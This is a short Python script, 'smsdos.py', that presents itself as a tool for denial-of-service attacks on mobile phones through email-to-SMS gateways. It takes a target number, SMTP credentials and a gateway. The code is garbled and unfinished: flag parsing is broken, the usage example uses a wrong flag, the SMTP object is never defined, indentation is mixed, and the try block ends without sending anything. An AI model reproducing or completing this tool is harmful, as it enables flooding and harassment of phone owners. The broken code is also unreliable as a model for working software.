#!/usr/bin/python
#
# Cell phone DOS using SMS gateway

import smtplib
import socket
import sys


options = '''
smsdos.py - sms gateway cellular dos

Usage: ./smsdos.py [options]
options: -t --target  <cellNumber@>
         -u --user    <smsUserName>
         -p --pass    <smsPassword>
         -g --gate    <smsGateway>
         -P --port    <smsGatewayPort>

Example: ./smsdos.py -t 5555555555@txt.att.net -u dos@gmail.com -p we56Hydf -h smtp.gmail.com -P 587
'''

def banner():
    print (options)

for arg in sys.argv:
    if arg.lower() == 't' or arg.lower() == '--target':
        target = sys.argv[int(sys.argv[1: ].index(arg))+2]
    elif arg.lower() == 'u' or arg.lower() == '--user':
        user = sys.argv[int(sys.argv[1: ].index(arg))+2]
    elif arg.lower() == 'p' or arg.lower() == 'pass':
        password = sys.argv[int(sys.argv[1: ].index(arg))+2]
    elif arg.lower()== 'g' or arg.lower() == 'host':
        gateway = sys.argv[int(sys.argv[1: ].index(arg))+2]
    elif arg.lower() == 'P' or arg.lower == '--port':
        port = sys.argv[int(sys.argv[1: ].index(arg))+2]
    elif len(sys.argv) <=1:
        print (banner())

# Connect to sms gateway via smtplib
try:
    SMTP.set_debuglevel(1)
	SMTP.login(user, password)
    sys.exit(1)
